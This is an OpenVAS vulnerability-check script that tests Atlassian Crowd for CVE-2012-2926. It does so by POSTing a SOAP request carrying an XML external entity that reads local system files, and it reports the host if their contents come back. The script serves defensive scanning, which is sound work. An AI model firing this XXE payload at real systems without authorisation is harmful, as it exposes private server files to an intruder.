###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_atlassian_crowd_53595.nasl 13835 2019-02-25 07:22:59Z cfischer $
#
# Atlassian Crowd XML Parsing Denial of Service Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:atlassian:crowd";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103512");
  script_bugtraq_id(53595);
  script_cve_id("CVE-2012-2926");
  script_tag(name:"cvss_base", value:"6.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:P");
  script_version("$Revision: 13835 $");
  script_name("Atlassian Crowd XML Parsing Denial of Service Vulnerability");
  script_tag(name:"last_modification", value:"$Date: 2019-02-25 08:22:59 +0100 (Mon, 25 Feb 2019) $");
  script_tag(name:"creation_date", value:"2012-07-11 15:40:23 +0200 (Wed, 11 Jul 2012)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_dependencies("gb_atlassian_crowd_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("atlassian_crowd/installed");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/53595");
  script_xref(name:"URL", value:"https://jira.atlassian.com/browse/JRA-27719");
  script_xref(name:"URL", value:"http://www.atlassian.com/software/jira/");
  script_xref(name:"URL", value:"http://confluence.atlassian.com/display/JIRA/JIRA+Security+Advisory+2012-05-17");

  script_tag(name:"solution", value:"Updates are available. Please see the references for more information.");

  script_tag(name:"summary", value:"Atlassian Crowd does not properly restrict the capabilities of third-party
  XML parsers, which allows remote attackers to read arbitrary files or cause a denial of
  service (resource consumption) via unspecified vectors.");

  script_tag(name:"affected", value:"Crowd before 2.0.9, 2.1 before 2.1.2, 2.2 before 2.2.9, 2.3 before 2.3.7,
  and 2.4 before 2.4.1.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + "/crowd/services";
req = http_get(item:url, port:port);
buf = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
if(!buf || "Invalid SOAP request" >!< buf)
  exit(0);

files = traversal_files();
useragent = http_get_user_agent();
host = http_host_name(port:port);

entity = rand_str(length:8, charset:"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ");

foreach pattern (keys(files)) {

  file = files[pattern];

  soap = '<!DOCTYPE foo [<!ENTITY ' + entity  + ' SYSTEM "file:///' + file + '"> ]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:SecurityServer" xmlns:aut="http://authentication.integration.crowd.atlassian.com" xmlns:soap="http://soap.integration.crowd.atlassian.com">
<soapenv:Header/>
<soapenv:Body>
<urn:addAllPrincipals>
<urn:in0>
<!--Optional:-->
<aut:name>?</aut:name>
<!--Optional:-->
<aut:token>?</aut:token>
</urn:in0>
<urn:in1>
<!--Zero or more repetitions:-->
<soap:SOAPPrincipalWithCredential>
<!--Optional:-->
<soap:passwordCredential>
<!--Optional:-->
<aut:credential>?</aut:credential>
<!--Optional:-->
<aut:encryptedCredential>?&' + entity  + ';</aut:encryptedCredential>
</soap:passwordCredential>
<!--Optional:-->
<soap:principal>
<!--Optional:-->
<soap:ID>?</soap:ID>
<!--Optional:-->
<soap:active>?</soap:active>
<!--Optional:-->
<soap:attributes>
<!--Zero or more repetitions:-->
<soap:SOAPAttribute>
<!--Optional:-->
<soap:name>?</soap:name>
<!--Optional:-->
<soap:values>
<!--Zero or more repetitions:-->
<urn:string>?</urn:string>
</soap:values>
</soap:SOAPAttribute>
</soap:attributes>';
  len = strlen(soap);

  req = string("POST ", url, " HTTP/1.1\r\n",
               "Host: ", host, "\r\n",
               "User-Agent: ", useragent, "\r\n",
               "SOAPAction: ", '""', "\r\n",
               "Content-Type: text/xml; charset=UTF-8\r\n",
               "Content-Length: ", len, "\r\n",
               "\r\n",
               soap);

  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if(egrep(pattern:pattern, string:res)) {
    report = report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);